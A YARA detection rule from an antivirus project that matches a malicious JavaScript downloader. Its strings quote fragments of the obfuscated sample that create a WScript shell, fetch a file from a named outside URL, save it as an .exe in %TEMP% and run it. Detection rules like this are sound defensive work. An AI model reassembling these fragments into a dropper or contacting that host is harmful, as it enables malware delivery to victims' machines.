rule sig_20160401_a826f462515ba125dfc0accaa43131f1 {
  meta:
    description = "datamaliciousorder - file 20160401_a826f462515ba125dfc0accaa43131f1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f74fe1400a9eb1c39d5381390e044b9b44a0965b9b18530b437daf19963c99af"

  strings:
    $s1  = "function YwvRvp(McvOh, MmNf){ZvHnh = ZvHnh * 1; return McvOh - MmNf;};" fullword ascii
    $s2  = "var XyKa = function VzzKp() {return WScript[QsFy](\"WScript\"+\".Shell\");}(), QiOt = 11;" fullword ascii
    $s3  = "TsWz[XbWab](\"G\" + \"ET\", \"http://grafikeria.pl/o9ows\", false);" fullword ascii
    $s4  = "if (TsWz[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function BgUcp(){return XtvZz + \"\";};" fullword ascii
    $s6  = "function DikWnh() {return XyKa[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"urvbN2hVQdxA.ex\" + \"e\";};" fullword ascii
    $s7  = "function PdhYvg() {return ((QccTg == true) && (QccTg == QhWw)) ? 1 : ZvHnh;};" fullword ascii
    $s8  = "var VxpIv = false;" fullword ascii
    $s9  = "function XwIr(VwyXhy) {var NchMmf = (1, 2, 3, 4, 5, VwyXhy); return NchMmf;};" fullword ascii
    $s10 = "function PgIuw(){return QsFy;};" fullword ascii
    $s11 = "QhWw = true; " fullword ascii
    $s12 = "QccTg = true; " fullword ascii
    $s13 = "}while (CtuAwb);" fullword ascii
    $s14 = "return YwvRvp(AoaZc, UiMat);" fullword ascii
    $s15 = "function SsCq(SbNh){XyKa[\"R\"+\"un\"](SbNh, ZvHnh, ZvHnh);};" fullword ascii
    $s16 = "var QhWw = false;" fullword ascii
    $s17 = "var QccTg = false;" fullword ascii
    $s18 = "function SiBzl()" fullword ascii
    $s19 = "function IqmAfk(){return 23;};" fullword ascii
    $s20 = "var MfxOn = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}